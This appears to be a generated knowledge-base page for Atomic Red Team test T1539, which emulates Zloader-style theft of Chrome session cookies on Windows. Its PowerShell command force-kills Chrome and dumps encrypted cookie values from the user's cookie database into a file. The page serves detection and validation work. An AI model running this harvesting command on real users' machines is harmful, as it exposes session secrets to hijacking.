---
atomic_guid: "26a6b840-4943-4965-8df5-ef1f9a282440"
title: "Steal Chrome Cookies (Windows)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1539"
attack_technique_name: "Steal Web Session Cookie"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "26a6b840-4943-4965-8df5-ef1f9a282440"
  - "Steal Chrome Cookies (Windows)"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# Steal Chrome Cookies (Windows)

This test queries Chrome's SQLite database to steal the encrypted cookie data, designed to function similarly to Zloader/Zbot's cookie theft function. 
Once an adversary obtains the encrypted cookie info, they could go on to decrypt the encrypted value, potentially allowing for session theft. 
Note: If Chrome is running, the process will be killed to ensure that the DB file isn't locked. 
See https://www.malwarebytes.com/resources/files/2020/05/the-silent-night-zloader-zbot_final.pdf.

## Metadata

- Atomic GUID: 26a6b840-4943-4965-8df5-ef1f9a282440
- Technique: T1539: Steal Web Session Cookie
- Platforms: windows
- Executor: powershell
- Elevation Required: False
- Dependency Executor: powershell
- Source Path: atomics/T1539/T1539.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1539-steal_web_session_cookie|T1539]]

## Input Arguments

### cookie_db

- description: Filepath for Chrome cookies database
- type: string
- default: $env:localappdata\Google\Chrome\User Data\Default\Network\Cookies

### output_file

- description: Filepath to output cookies
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\T1539ChromeCookies.txt

### sqlite3_path

- description: Path to sqlite3
- type: path
- default: PathToAtomicsFolder\..\ExternalPayloads\sqlite-tools-win32-x86-3380200\sqlite3.exe

## Dependencies

Sqlite3 must exist at (#{sqlite3_path})

### Prerequisite Check

```powershell
if (Test-Path "#{sqlite3_path}") {exit 0} else {exit 1}
```

### Get Prerequisite

```powershell
New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest "https://www.sqlite.org/2022/sqlite-tools-win32-x86-3380200.zip" -OutFile "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip"
Expand-Archive -path "PathToAtomicsFolder\..\ExternalPayloads\sqlite.zip" -destinationpath "PathToAtomicsFolder\..\ExternalPayloads\" -force
```

## Executor

- elevation_required: False
- name: powershell

### Command

```powershell
stop-process -name "chrome" -force -erroraction silentlycontinue
"select host_key, name, encrypted_value, path, expires_utc, is_secure, is_httponly from [Cookies];" | cmd /c #{sqlite3_path} "#{cookie_db}" | out-file -filepath "#{output_file}"
```

### Cleanup

```powershell
remove-item #{output_file}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1539/T1539.yaml)
